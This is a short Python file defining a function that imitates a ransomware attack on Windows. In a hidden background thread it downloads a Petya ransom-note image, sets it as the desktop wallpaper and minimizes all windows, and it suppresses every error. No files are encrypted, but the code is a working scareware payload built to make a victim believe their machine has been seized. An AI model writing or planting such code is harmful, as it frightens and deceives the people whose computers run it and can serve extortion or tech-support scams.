import os, tempfile, urllib.request, ctypes, threading

def fake_ransom():
    """Triggers a fake ransom screen by changing wallpaper and minimizing windows."""
    def _ransom():
        try:
            url = "https://www.malwaretech.com/wp-content/uploads/2017/06/petya.png"
            p = os.path.join(tempfile.gettempdir(), "fkr.png")
            urllib.request.urlretrieve(url, p)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, p, 3)
            ctypes.windll.user32.PostMessageW(0xFFFF, 0x111, 419, 0)
        except:
            pass

    threading.Thread(target=_ransom, daemon=True).start()
